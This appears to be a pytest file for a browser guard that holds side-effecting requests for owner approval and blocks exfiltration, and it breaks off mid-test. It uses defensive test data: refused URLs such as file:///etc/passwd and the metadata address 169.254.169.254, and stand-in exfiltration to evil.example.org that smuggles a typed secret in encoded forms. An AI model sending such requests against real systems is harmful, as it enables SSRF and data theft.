"""UserGuard v2, holds and exfiltration rules (plan 6.7 and 10.3, WI-9).

Pure policy tests run without a browser. The browser tests drive a real
headless Chromium through a local fixture server that is its HTTP proxy: it
answers CONNECT for every host, terminates TLS with a throwaway certificate
(the context sets ignore_https_errors), serves the pages below, echoes
WebSockets, and records every request so a test can prove what never left
the browser. The hold transport is a fake that signs real Ed25519 tokens.
"""

from __future__ import annotations

import asyncio
import base64
import datetime
import hashlib
import json
import os
import socketserver
import ssl
import struct
import tempfile
import threading
import time
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler
from typing import Any, Callable
from urllib.parse import parse_qs, quote, urlsplit
from uuid import UUID, uuid4

import pytest
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.x509.oid import NameOID

from bdr_agent.agents.user_browser_v2 import exfil, guard as guard_mod
from bdr_agent.agents.user_browser_v2.exfil import (
    EXFIL_LAUNCH_ARGS,
    TypedStrings,
    check_navigate_url,
    trace_url,
)
from bdr_agent.agents.user_browser_v2.guard import (
    RequestFacts,
    UserGuardV2,
    build_guard,
    floor_verdict,
    label_is_final,
)
from bdr_agent.agents.user_browser_v2.holds import (
    EndpointHoldTransport,
    HeldTarget,
    HoldBroker,
    HoldTokenVerifier,
    TokenRefused,
    load_hold_public_keys,
    request_hashes,
    summarize_body,
)
from bdr_agent.protocol import (
    HOLD_TOKEN_FIELDS,
    UserHoldRelease,
    UserHoldRequest,
    UserHoldToken,
    UserJobPolicy,
    UserSiteHoldRequest,
    canonical_hold_token_bytes,
)

from .agent_harness import needs_browser

JOB_ID = UUID("11111111-2222-4333-8444-555555555555")
EPOCH = 3
KEY_ID = "hold-test-1"
START = "https://site.example.com"
TYPED = "SECRETDATA-1234567890"
HOSTS = ("site.example.com", "app.example.com", "login.example.com", "other.example.net",
         "evil.example.org", "cdn.example.net", "www.google-analytics.com")


# Policy and tokens ---------------------------------------------------------------------


def make_policy(*, kind: str = "ad_hoc", profile: dict | None = None, safe_rules: list | None = None,
                credentials: bool = False, extra_sites: list | None = None, version: int = 1,
                offsite_bytes: int = 4096) -> UserJobPolicy:
    sites = [{"site_key": "site", "label": "Example", "kind": kind, "scope": "domain", "grant_version": 1,
              "registrable_domains": ["example.com"], "profile": profile or {}}]
    sites += extra_sites or []
    data: dict[str, Any] = {"policy_version": version, "job_id": str(JOB_ID), "start_origin": START,
                            "sites": sites, "safe_rules": safe_rules or [],
                            "caps": {"offsite_query_bytes": offsite_bytes, "hold_timeout_seconds": 60}}
    if credentials:
        data["credentials"] = [{"credential_id": str(CRED_ID), "site_key": "site", "account_label": "Main",
                                "version": 1, "login_origins": ["https://login.example.com"],
                                "cookie_domains": [".example.com"]}]
    return UserJobPolicy.model_validate(data)


CRED_ID = UUID("99999999-8888-4777-8666-555555555555")
SIGNING_KEY = Ed25519PrivateKey.generate()
PUBLIC_RAW = SIGNING_KEY.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)


def verifier() -> HoldTokenVerifier:
    return HoldTokenVerifier(load_hold_public_keys({KEY_ID: base64.b64encode(PUBLIC_RAW).decode()}))


def sign(fields: dict[str, Any], key: Ed25519PrivateKey = SIGNING_KEY, key_id: str = KEY_ID) -> UserHoldToken:
    sig = base64.b64encode(key.sign(canonical_hold_token_bytes(fields))).decode()
    return UserHoldToken.model_validate({**fields, "key_id": key_id, "signature": sig})


def token_for(req: UserHoldRequest, hold_id: UUID, **over: Any) -> UserHoldToken:
    fields = {"job_id": str(JOB_ID), "lease_epoch": EPOCH, "hold_id": str(hold_id), "method": req.method,
              "origin": req.origin, "url_sha256": req.url_sha256, "body_sha256": req.body_sha256,
              "exp": int(time.time()) + 120}
    fields.update(over)
    return sign(fields)


class FakeHolds:
    """The server side of holds: records every hold and answers per `decide`.
    decide(req) -> "release" | "decline" | "expire" | ("release", token_overrides)
    site_decide(req) -> "full" | "site_only" | "decline"."""

    def __init__(self, decide: Callable[[Any], Any] = lambda r: "decline",
                 site_decide: Callable[[Any], Any] = lambda r: "decline") -> None:
        self.decide = decide
        self.site_decide = site_decide
        self.final: list[UserHoldRequest] = []
        self.sites: list[UserSiteHoldRequest] = []
        self.polls = 0
        self._pending: dict[UUID, UserHoldRelease] = {}

    async def open_hold(self, req: UserHoldRequest) -> UserHoldRelease:
        self.final.append(req)
        hold_id = uuid4()
        answer = self.decide(req)
        over: dict[str, Any] = {}
        if isinstance(answer, tuple):
            answer, over = answer
        if answer == "release":
            final = UserHoldRelease(hold_id=hold_id, status="released", token=token_for(req, hold_id, **over))
        elif answer == "expire":
            final = UserHoldRelease(hold_id=hold_id, status="expired")
        else:
            final = UserHoldRelease(hold_id=hold_id, status="declined", label="Owner said no")
        self._pending[hold_id] = final
        return UserHoldRelease(hold_id=hold_id, status="pending", retry_after=0)

    async def poll_release(self, hold_id: UUID) -> UserHoldRelease:
        self.polls += 1
        return self._pending[hold_id]

    async def open_site_hold(self, req: UserSiteHoldRequest) -> UserHoldRelease:
        self.sites.append(req)
        hold_id = uuid4()
        answer = self.site_decide(req)
        if answer in ("full", "site_only"):
            final = UserHoldRelease(hold_id=hold_id, kind="site", status="released", site_release=answer,
                                    policy_version=2)
        else:
            final = UserHoldRelease(hold_id=hold_id, kind="site", status="declined")
        self._pending[hold_id] = final
        return UserHoldRelease(hold_id=hold_id, kind="site", status="pending", retry_after=0)


async def _no_sleep(_s: float) -> None:
    await asyncio.sleep(0)


def make_guard(policy: UserJobPolicy, fake: FakeHolds, **kw: Any) -> UserGuardV2:
    broker = HoldBroker(transport=fake, verifier=verifier(), job_id=JOB_ID, lease_epoch=lambda: EPOCH,
                        timeout_seconds=60, sleep=_no_sleep)
    return UserGuardV2(policy, broker, **kw)


# Pure policy: floor, exfiltration, decisions -------------------------------------------


@pytest.mark.parametrize("url", [
    "http://192.168.1.1/", "http://10.0.0.5/x", "http://[fd00::1]/", "http://[::ffff:10.0.0.5]/",
    "http://0.0.0.0/", "http://[64:ff9b::a00:5]/", "http://167772165/", "http://0xA000005/",
    "http://012.0.0.5/", "http://router.local/", "http://nas.lan/", "http://box.internal/", "http://x.home.arpa/",
    "http://localhost/", "http://intranet/", "http://127.1/", "http://[::1]/", "http://[fe80::1]/",
    "http://100.64.0.1/", "http://169.254.169.254/latest", "http://[2002:a00:5::]/", "http://224.0.0.1/",
    "file:///etc/passwd", "chrome://settings", "devtools://x", "javascript:alert(1)",
    "https://user:pw@site.example.com/", "http://[::a00:5]/",
])
def test_floor_refuses_private_hosts_and_bad_schemes(url):
    assert not floor_verdict(url, top_level=True)
    assert not floor_verdict(url, top_level=False)


def test_floor_allows_public_hosts_and_subresource_data():
    assert floor_verdict("https://site.example.com/a?b=c", top_level=True)
    assert floor_verdict("http://93.184.216.34/", top_level=False)
    assert floor_verdict("data:image/png;base64,AAAA", top_level=False)
    assert not floor_verdict("data:text/html,<b>x</b>", top_level=True)
    assert floor_verdict("about:blank", top_level=True)


def test_typed_strings_raw_encoded_base64_and_windows():
    t = TypedStrings()
    t.add("short")
    assert not t.armed and t.is_typed("short")
    t.add(TYPED)
    assert t.found_in(f"https://evil.example.org/?d={TYPED}")
    assert t.found_in(f"https://evil.example.org/?d={TYPED.lower()}")
    assert t.found_in("https://evil.example.org/?d=" + quote(quote(TYPED, safe=""), safe=""))
    for offset in range(3):
        blob = base64.b64encode(b"x" * offset + TYPED.encode()).decode()
        assert t.found_in(f"https://evil.example.org/?d={blob}"), offset
        assert t.found_in("", json.dumps({"d": base64.urlsafe_b64encode(b"yy" + TYPED.encode()).decode()}).encode())
    assert t.found_in("", json.dumps({"comment": TYPED}).encode())
    assert not t.found_in("https://evil.example.org/?d=SECRETDATA-12")
    long = "The quick brown fox jumps over the lazy dog near the riverbank at dawn"
    t.add(long)
    assert t.found_in("https://cdn.example.net/i.png?alt=" + quote(long[20:60]))
    assert not t.found_in("https://cdn.example.net/i.png?alt=fox")


def test_navigate_url_rule():
    assert check_navigate_url("https://site.example.com/rfis?page=2")
    assert not check_navigate_url("https://site.example.com/?" + "a" * 2100)
    assert not check_navigate_url("https://site.example.com/?q=" + "x" * 257)
    assert not check_navigate_url("https://site.example.com/?q=" + "QUJD" * 17)
    assert not check_navigate_url("https://site.example.com/#" + "ab12" * 17)
    long = "https://site.example.com/r?token=" + "QUJD" * 40
    assert check_navigate_url(long, page_links=[long])
    assert check_navigate_url(long, start_url=long)


def test_offsite_query_budget_and_redirect_hops_do_not_count():
    g = make_guard(make_policy(offsite_bytes=40), FakeHolds())
    f1 = RequestFacts("GET", "https://other.example.net/a?" + "q=" + "x" * 30, navigation=True)
    assert g.decide(f1).action == "site_hold"
    f2 = RequestFacts("GET", "https://other.example.net/b?" + "q=" + "y" * 30, navigation=True)
    assert g.decide(f2).reason == "offsite_query_cap"
    hop = RequestFacts("GET", "https://other.example.net/c?" + "q=" + "z" * 300, navigation=True, hop=True)
    assert g.decide(hop).action == "site_hold"
    same = RequestFacts("GET", START + "/x?" + "q=" + "w" * 300, navigation=True)
    assert g.decide(same).action == "fetch"


def test_decisions_without_browser():
    g = make_guard(make_policy(profile={
        "safe_mutations": [{"method": "POST", "host": "site.example.com", "path_regex": "/api/search"},
                           {"method": "POST", "host": "site.example.com", "path_regex": "/graphql",
                            "graphql_operations": ["ListRfis"]},
                           {"method": "POST", "host": "site.example.com", "path_regex": "/api/delete"}],
        "final_actions": [{"method": "POST", "host": "site.example.com", "path_regex": "/rfis/\\d+/answer",
                           "label": "Answer RFI"}],
        "final_get": [{"host": "site.example.com", "path_regex": "/files/\\d+/delete"}]}), FakeHolds())
    d = g.decide(RequestFacts("POST", START + "/api/search", resource_type="fetch"))
    assert (d.action, d.reason) == ("fetch", "safe_mutation")
    gql = json.dumps({"operationName": "ListRfis", "query": "query ListRfis { rfis { id } }"}).encode()
    assert g.decide(RequestFacts("POST", START + "/graphql", resource_type="fetch", body=gql)).action == "fetch"
    mut = json.dumps({"operationName": "ListRfis", "query": "mutation ListRfis { del }"}).encode()
    assert g.decide(RequestFacts("POST", START + "/graphql", resource_type="fetch", body=mut)).action == "hold"
    # A verb in the path is never auto-released, even when a rule lists it.
    assert g.decide(RequestFacts("POST", START + "/api/delete", resource_type="fetch")).action == "hold"
    d = g.decide(RequestFacts("POST", START + "/rfis/12/answer", resource_type="fetch"))
    assert (d.action, d.profile_label) == ("hold", "Answer RFI")
    assert g.decide(RequestFacts("GET", START + "/files/4/delete", navigation=True)).action == "hold"
    assert g.decide(RequestFacts("GET", START + "/files/4", navigation=True)).action == "fetch"
    assert g.decide(RequestFacts("GET", START + "/app.js", resource_type="script")).action == "continue"
    assert g.decide(RequestFacts("POST", START + "/b", resource_type="ping")).action == "drop"
    assert g.decide(RequestFacts("GET", "https://www.google-analytics.com/g/collect")).action == "drop"
    d = g.decide(RequestFacts("POST", "https://evil.example.org/x", resource_type="fetch"))
    assert (d.action, d.out_of_scope) == ("hold", True)
    d = g.decide(RequestFacts("GET", "https://login.microsoftonline.com/common", navigation=True))
    assert (d.action, d.reason) == ("refuse", "identity_provider")
    assert g.decide(RequestFacts("GET", "https://cdn.example.net/x.png", resource_type="image")).action == "continue"


def test_owner_safe_rule_releases_only_that_endpoint():
    rules = [{"site_key": "site", "method": "POST", "host": "site.example.com", "path_pattern": "/api/autosave/\\d+"}]
    g = make_guard(make_policy(safe_rules=rules), FakeHolds())
    assert g.decide(RequestFacts("POST", START + "/api/autosave/12", resource_type="xhr")).action == "fetch"
    assert g.decide(RequestFacts("PUT", START + "/api/autosave/12", resource_type="xhr")).action == "hold"
    assert g.decide(RequestFacts("POST", "https://app.example.com/api/autosave/12", resource_type="xhr")).action == "hold"


def test_typed_string_rule_in_and_out_of_scope():
    g = make_guard(make_policy(), FakeHolds())
    g.typed.add(TYPED)
    body = f"comment={TYPED}".encode()
    d = g.decide(RequestFacts("POST", "https://evil.example.org/c", resource_type="fetch", body=body))
    assert (d.action, d.reason) == ("refuse", "typed_string_offsite")
    # In scope on another host: the owner's card, never auto-released.
    d = g.decide(RequestFacts("POST", "https://app.example.com/c", resource_type="fetch", body=body))
    assert d.action == "hold"
    # The start origin is where typed text belongs.
    assert g.decide(RequestFacts("POST", START + "/c", resource_type="fetch", body=body)).action == "hold"
    assert g.decide(RequestFacts("GET", START + f"/s?q={TYPED}", navigation=True)).action == "fetch"
    d = g.decide(RequestFacts("GET", f"https://cdn.example.net/p.png?d={TYPED}", resource_type="image"))
    assert d.reason == "typed_string_offsite"


def test_verb_labels():
    assert label_is_final(["Accept bid"])
    assert label_is_final(["Submitted"]) and label_is_final(["Send RFI response"])
    assert label_is_final([], ["https://site.example.com/files/9/delete"])
    assert label_is_final([], ["https://site.example.com/x?action=delete_item"])
    assert not label_is_final(["Sign in"]) and not label_is_final(["Log out"])
    assert not label_is_final(["Accept all cookies"])
    assert not label_is_final(["Assignment", "Payment history", "Designer"])
    assert not label_is_final(["Open file"], ["https://site.example.com/files/9"])


def test_trace_url_keeps_origin_and_path_only():
    url = "https://site.example.com/a/" + "Z" * 30 + "/b?token=abc#frag"
    assert trace_url(url) == "https://site.example.com/a/:token/b"


def test_summary_shows_only_typed_values_and_redacts():
    t = TypedStrings()
    t.add("Alice Example")
    body = b"name=Alice+Example&passwd=Alice+Example&pwd=hunter2&pin=1234"
    fields = summarize_body(body, "application/x-www-form-urlencoded", t,
                            redact=lambda s: s.replace("hunter2", "[redacted]"))
    shown = {f.name: f.value for f in fields}
    assert shown["name"] == "Alice Example"
    assert shown["pwd"] is None and shown["pin"] is None
    # A typed value is shown even under a password-like name: it came from the model.
    assert shown["passwd"] == "Alice Example"
    js = summarize_body(json.dumps({"a": {"b": "Alice Example", "c": "x"}}).encode(), "application/json", t)
    assert [(f.name, f.value) for f in js] == [("a.b", "Alice Example"), ("a.c", None)]
    mp = (b"--XX\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\nAlice Example\r\n"
          b"--XX\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.pdf\"\r\n\r\n%PDF\r\n--XX--\r\n")
    names = [(f.name, f.value) for f in summarize_body(mp, "multipart/form-data; boundary=XX", t)]
    assert names == [("title", "Alice Example"), ("f (file)", None)]


# Tokens --------------------------------------------------------------------------------


def _target(**over: Any) -> HeldTarget:
    base = dict(job_id=JOB_ID, lease_epoch=EPOCH, hold_id=UUID(int=7), method="POST",
                origin=START, url_sha256="a" * 64, body_sha256="b" * 64)
    base.update(over)
    return HeldTarget(**base)


def _token(**over: Any) -> UserHoldToken:
    fields = {"job_id": str(JOB_ID), "lease_epoch": EPOCH, "hold_id": str(UUID(int=7)), "method": "POST",
              "origin": START, "url_sha256": "a" * 64, "body_sha256": "b" * 64, "exp": int(time.time()) + 100}
    fields.update(over)
    return sign(fields)


@pytest.mark.parametrize("over,reason", [
    ({"body_sha256": "c" * 64}, "body_mismatch"),
    ({"url_sha256": "c" * 64}, "url_mismatch"),
    ({"hold_id": str(UUID(int=8))}, "hold_mismatch"),
    ({"lease_epoch": EPOCH - 1}, "epoch_mismatch"),
    ({"exp": int(time.time()) - 1}, "expired"),
    ({"exp": int(time.time()) + 3600}, "exp_too_far"),
    ({"job_id": str(uuid4())}, "job_mismatch"),
    ({"method": "PUT"}, "method_mismatch"),
    ({"origin": "https://evil.example.org"}, "origin_mismatch"),
])
def test_token_refused_for_any_other_request(over, reason):
    with pytest.raises(TokenRefused) as err:
        verifier().verify(_token(**over), _target())
    assert err.value.reason == reason


def test_token_signature_key_and_single_use():
    v = verifier()
    good = _token()
    forged = good.model_copy(update={"body_sha256": "c" * 64})
    with pytest.raises(TokenRefused, match="bad_signature"):
        v.verify(forged, _target(body_sha256="c" * 64))
    other = Ed25519PrivateKey.generate()
    with pytest.raises(TokenRefused, match="bad_signature"):
        v.verify(sign(_token_fields(), key=other), _target())
    with pytest.raises(TokenRefused, match="unknown_key"):
        v.verify(sign(_token_fields(), key_id="nope"), _target())
    v.verify(good, _target())
    with pytest.raises(TokenRefused, match="already_used"):
        v.verify(good, _target())
    assert v.used(UUID(int=7))
    with pytest.raises(TokenRefused, match="unknown_key"):
        HoldTokenVerifier({}).verify(_token(), _target())   # no compiled key: fail closed


def _token_fields() -> dict[str, Any]:
    t = _token()
    return {k: v for k, v in t.model_dump(mode="json").items() if k in HOLD_TOKEN_FIELDS}


async def test_endpoint_transport_uses_v2_endpoints():
    calls = []
    hold_id = uuid4()

    async def send(method, path, body, query):
        calls.append((method, path, body))
        return {"hold_id": str(hold_id), "status": "pending"}

    t = EndpointHoldTransport(send, JOB_ID)
    url = START + "/x"
    us, bs = request_hashes(url, b"a=1")
    await t.open_hold(UserHoldRequest(trigger="network", method="POST", url=url, origin=START, url_sha256=us,
                                      body_sha256=bs))
    await t.poll_release(hold_id)
    await t.open_site_hold(UserSiteHoldRequest(trigger="link", url="https://evil.example.org/",
                                               target_origin="https://evil.example.org"))
    assert [c[:2] for c in calls] == [
        ("POST", f"/jobs/{JOB_ID}/user/holds"),
        ("GET", f"/jobs/{JOB_ID}/user/holds/{hold_id}/release"),
        ("POST", f"/jobs/{JOB_ID}/user/site-hold"),
    ]


async def test_broker_rejects_token_for_stale_epoch_and_expires():
    epoch = {"v": EPOCH}
    fake = FakeHolds(decide=lambda r: "release")
    broker = HoldBroker(transport=fake, verifier=verifier(), job_id=JOB_ID, lease_epoch=lambda: epoch["v"],
                        timeout_seconds=60, sleep=_no_sleep)
    url = START + "/x"
    us, bs = request_hashes(url, b"")
    req = UserHoldRequest(trigger="network", method="POST", url=url, origin=START, url_sha256=us, body_sha256=bs)
    epoch["v"] = EPOCH + 1      # re-leased: the token for the old epoch is refused
    result = await broker.hold_final(req, label="x")
    assert (result.status, result.reason) == ("refused", "epoch_mismatch")
    epoch["v"] = EPOCH
    assert (await broker.hold_final(req, label="x")).released
    fake.decide = lambda r: "expire"
    result = await broker.hold_final(req, label="Send it")
    assert result.status == "expired" and "did not answer in time" in result.notice
    assert broker.open_count == 0 and broker.idle.is_set()


# Fixture site ----------------------------------------------------------------------------


_CERT: tuple[str, str] | None = None


def _cert() -> tuple[str, str]:
    global _CERT
    if _CERT is None:
        key = ec.generate_private_key(ec.SECP256R1())
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "bdr-v2-guard-fixture")])
        now = datetime.datetime.now(datetime.UTC)
        cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key())
                .serial_number(x509.random_serial_number()).not_valid_before(now - datetime.timedelta(days=1))
                .not_valid_after(now + datetime.timedelta(days=2))
                .add_extension(x509.SubjectAlternativeName([x509.DNSName(h) for h in HOSTS]), critical=False)
                .sign(key, hashes.SHA256()))
        d = tempfile.mkdtemp(prefix="bdr-v2-guard-")
        cpath, kpath = os.path.join(d, "c.pem"), os.path.join(d, "k.pem")
        with open(cpath, "wb") as fh:
            fh.write(cert.public_bytes(serialization.Encoding.PEM))
        with open(kpath, "wb") as fh:
            fh.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                                       serialization.NoEncryption()))
        _CERT = (cpath, kpath)
    return _CERT


@dataclass
class Seen:
    method: str
    host: str
    path: str
    query: str
    body: bytes
    headers: dict = field(default_factory=dict, compare=False, repr=False)


HTML = "text/html; charset=utf-8"
JS = "text/javascript"
SITE_HOME = """<!doctype html><html><body>
<a id="accept" href="/bids/7/accept">Accept bid</a>
<a id="del" href="/files/9/delete">Delete</a>
<a id="plain" href="/files/9">Open file</a>
<a id="bounce" href="/bounce">Bounce</a>
<a id="hop" href="/hop">Hop</a>
<button id="fetchpost" onclick="window.r = fetch('/api/save', {method: 'POST', body: 'x=1'}).then(r => r.status).catch(e => 'err')">Save</button>
<form id="f" method="post" action="/form/submit"><input id="name" name="name"><input id="passwd" name="passwd" type="password"><button id="go">Go</button></form>
<iframe id="ifr" src="/frame"></iframe>
</body></html>"""
LOGIN_PAGE = """<!doctype html><html><body>
<form id="lf" method="post" action="/session"><input id="user" name="username"><input id="pw" name="password" type="password"><button id="signin">Submit</button></form>
<a id="elsewhere" href="/help">Help</a>
</body></html>"""
WORKER_JS = "fetch('https://site.example.com/api/worker', {method: 'POST', body: 'w=1'}).then(r => postMessage('done:' + r.status)).catch(e => postMessage('err'))"


# Worker scripts that report what their scope can do (review WI-9: a worker
# scope must have no socket API, and real workers must keep working).
WORKER_SCRIPTS = {
    "/wk.js": "importScripts('wk-dep.js'); postMessage(['classic', typeof WebSocket, typeof WebSocketStream, dep,"
              " self.location.pathname]);",
    "/wk-dep.js": "var dep = 1;",
    "/wkm.js": "import {dep} from './wkm-dep.js'; postMessage(['module', typeof WebSocket, typeof WebTransport,"
               " dep, new URL(import.meta.url).pathname]);",
    "/wkm-dep.js": "export const dep = 2;",
    "/wk-ws.js": "try { const s = new WebSocket('wss://evil.example.org/sock-http'); s.onopen = () => s.send('X'); }"
                 " catch (e) { postMessage('blocked:' + e.name); }",
}


class _Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    tls_host: str | None = None

    def log_message(self, *args) -> None:
        return

    def do_CONNECT(self) -> None:
        host = self.path.rsplit(":", 1)[0]
        self.send_response(200, "Connection established")
        self.end_headers()
        try:
            conn = self.server.sslctx.wrap_socket(self.connection, server_side=True)   # type: ignore[attr-defined]
        except (ssl.SSLError, OSError):
            self.close_connection = True
            return
        try:
            _TlsHandler(conn, self.client_address, self.server, host)
        except (ssl.SSLError, OSError, ConnectionError):
            pass
        self.close_connection = True

    def _dispatch(self) -> None:
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length) if length else b""
        parts = urlsplit(self.path)
        host = (self.tls_host or parts.hostname or self.headers.get("Host", "")).lower()
        site: FixtureSite = self.server.site   # type: ignore[attr-defined]
        seen = Seen(self.command, host, parts.path or "/", parts.query, body, dict(self.headers.items()))
        with site.lock:
            site.seen.append(seen)
        if self.headers.get("Upgrade", "").lower() == "websocket":
            self._websocket(site)
            return
        status, headers, payload = site.respond(seen)
        self.send_response(status)
        for k, v in headers:
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(payload)

    do_GET = do_POST = do_HEAD = do_PUT = do_DELETE = do_PATCH = do_OPTIONS = _dispatch

    def _websocket(self, site: "FixtureSite") -> None:
        key = self.headers["Sec-WebSocket-Key"]
        accept = base64.b64encode(hashlib.sha1((key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest())
        self.send_response(101, "Switching Protocols")
        self.send_header("Upgrade", "websocket")
        self.send_header("Connection", "Upgrade")
        self.send_header("Sec-WebSocket-Accept", accept.decode())
        self.end_headers()
        self.wfile.flush()
        while True:
            head = self.rfile.read(2)
            if len(head) < 2:
                return
            opcode, size = head[0] & 0x0F, head[1] & 0x7F
            if size == 126:
                size = struct.unpack(">H", self.rfile.read(2))[0]
            elif size == 127:
                size = struct.unpack(">Q", self.rfile.read(8))[0]
            mask = self.rfile.read(4) if head[1] & 0x80 else b"\0\0\0\0"
            data = bytes(b ^ mask[i % 4] for i, b in enumerate(self.rfile.read(size)))
            if opcode == 8:
                self.wfile.write(b"\x88\x00")
                return
            if opcode in (1, 2):
                with site.lock:
                    site.ws_messages.append(data)
                frame = bytes([0x80 | opcode]) + (bytes([len(data)]) if len(data) < 126 else
                                                  b"\x7e" + struct.pack(">H", len(data)))
                self.wfile.write(frame + data)
                self.wfile.flush()


class _TlsHandler(_Handler):
    def __init__(self, request, client_address, server, host: str):
        self.tls_host = host
        super().__init__(request, client_address, server)


class _Server(socketserver.ThreadingMixIn, socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

    def handle_error(self, request, client_address) -> None:
        return


class FixtureSite:
    def __init__(self) -> None:
        self.seen: list[Seen] = []
        self.ws_messages: list[bytes] = []
        self.lock = threading.RLock()
        self._server = _Server(("127.0.0.1", 0), _Handler)
        self._server.site = self   # type: ignore[attr-defined]
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(*_cert())
        self._server.sslctx = ctx   # type: ignore[attr-defined]
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._server.shutdown()
        self._server.server_close()

    @property
    def proxy_url(self) -> str:
        host, port = self._server.server_address[:2]
        return f"http://{host}:{port}"

    def hits(self, host: str, path: str | None = None, method: str | None = None) -> list[Seen]:
        with self.lock:
            return [s for s in self.seen if s.host == host and (path is None or s.path == path)
                    and (method is None or s.method == method)]

    def respond(self, s: Seen) -> tuple[int, list[tuple[str, str]], bytes]:
        def page(body: str, ctype: str = HTML) -> tuple[int, list[tuple[str, str]], bytes]:
            return 200, [("Content-Type", ctype)], body.encode()

        def redirect(status: int, location: str) -> tuple[int, list[tuple[str, str]], bytes]:
            return status, [("Location", location), ("Content-Type", "text/plain")], b""

        key = (s.host, s.path)
        if s.host == "site.example.com":
            if s.path == "/":
                return page(SITE_HOME)
            if s.path == "/frame":
                return page('<form id="ff" method="post" action="/frame/post"><input name="a" value="1"></form>')
            if s.path == "/post307":
                return redirect(307, "/post307b")
            if s.path == "/post308":
                return redirect(308, "/post308b")
            if s.path == "/bounce":
                return redirect(302, "https://other.example.net/land")
            if s.path == "/hop":
                return redirect(302, "/landed")
            if s.path == "/go":
                return redirect(302, parse_qs(s.query).get("to", ["/"])[0])
            if s.path == "/w.js":
                return page(WORKER_JS, JS)
            if s.path in WORKER_SCRIPTS:
                return page(WORKER_SCRIPTS[s.path], JS)
            if s.path == "/landed":
                return page("<p id=landed>landed</p>")
            return page("ok", "text/plain")
        if s.host == "login.example.com":
            if s.path == "/login":
                return page(LOGIN_PAGE)
            if s.path == "/session":
                return page("<p id=welcome>welcome</p>")
            return page("ok", "text/plain")
        if s.host in ("other.example.net", "evil.example.org", "cdn.example.net", "app.example.com"):
            return page("<p id=other>other</p>")
        del key
        return 404, [("Content-Type", "text/plain")], b"nf"


@pytest.fixture
def site():
    s = FixtureSite()
    yield s
    s.stop()


class Browser:
    def __init__(self, site: FixtureSite, guard: UserGuardV2, args: tuple[str, ...] = ()) -> None:
        self.site, self.guard, self.args = site, guard, args

    async def __aenter__(self) -> "Browser":
        from playwright.async_api import async_playwright

        self._pw_cm = async_playwright()
        self.pw = await self._pw_cm.__aenter__()
        self.browser = await self.pw.chromium.launch(proxy={"server": self.site.proxy_url}, args=list(self.args))
        self.context = await self.browser.new_context(ignore_https_errors=True, service_workers="block")
        self.context.set_default_timeout(8_000)
        await self.guard.install(self.context)
        self.page = await self.context.new_page()
        return self

    async def __aexit__(self, *exc: Any) -> None:
        await self.guard.settle()
        await self.browser.close()
        await self._pw_cm.__aexit__(None, None, None)

    async def goto(self, url: str) -> None:
        await self.page.goto(url, wait_until="domcontentloaded")


async def until(cond: Callable[[], Any], timeout: float = 6.0) -> bool:
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        if cond():
            return True
        await asyncio.sleep(0.05)
    return bool(cond())


async def settle_holds(g: UserGuardV2, fake: FakeHolds, count: int, *, site: bool = False) -> None:
    assert await until(lambda: len(fake.sites if site else fake.final) >= count), (fake.final, fake.sites)
    assert await g.wait_holds(10)


# Browser tests: final-action holds (plan 6.7) ------------------------------------------------


@needs_browser
async def test_fetch_post_on_click_is_held_and_declined(site):
    fake = FakeHolds()
    g = make_guard(make_policy(), fake)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.click("#fetchpost")
        await settle_holds(g, fake, 1)
        assert await b.page.evaluate("window.r") == "err"
    req = fake.final[0]
    assert (req.trigger, req.method, req.url, req.frame) == ("network", "POST", START + "/api/save", "main")
    assert req.body_sha256 == hashlib.sha256(b"x=1").hexdigest()
    assert not site.hits("site.example.com", "/api/save")
    assert any("declined" in n for n in g.take_notices())


@needs_browser
async def test_released_post_reaches_the_site_exactly_once(site):
    fake = FakeHolds(decide=lambda r: "release")
    g = make_guard(make_policy(), fake)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.click("#fetchpost")
        await settle_holds(g, fake, 1)
        assert await b.page.evaluate("window.r") == 200
    assert len(site.hits("site.example.com", "/api/save", "POST")) == 1
    assert g.side_effects and g.released_requests == 1


@needs_browser
async def test_token_for_another_body_never_releases(site):
    fake = FakeHolds(decide=lambda r: ("release", {"body_sha256": "0" * 64}))
    g = make_guard(make_policy(), fake)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.click("#fetchpost")
        await settle_holds(g, fake, 1)
        assert await b.page.evaluate("window.r") == "err"
    assert not site.hits("site.example.com", "/api/save")


@needs_browser
@pytest.mark.parametrize("how", ["enter", "request_submit", "classic_submit", "button_click"])
async def test_form_submissions_are_held(site, how):
    fake = FakeHolds()
    g = make_guard(make_policy(), fake)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.fill("#name", "Alice Example")
        if how == "enter":
            await b.page.focus("#name")
            await b.page.keyboard.press("Enter")
        elif how == "request_submit":
            await b.page.evaluate("document.getElementById('f').requestSubmit()")
        elif how == "classic_submit":
            await b.page.evaluate("document.getElementById('f').submit()")
        else:
            await b.page.click("#go", no_wait_after=True)
        await settle_holds(g, fake, 1)
    assert fake.final[0].url == START + "/form/submit" and fake.final[0].method == "POST"
    assert not site.hits("site.example.com", "/form/submit")


@needs_browser
async def test_xhr_put_and_iframe_post_are_held(site):
    fake = FakeHolds()
    g = make_guard(make_policy(), fake)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.evaluate("""() => new Promise(res => { const x = new XMLHttpRequest();
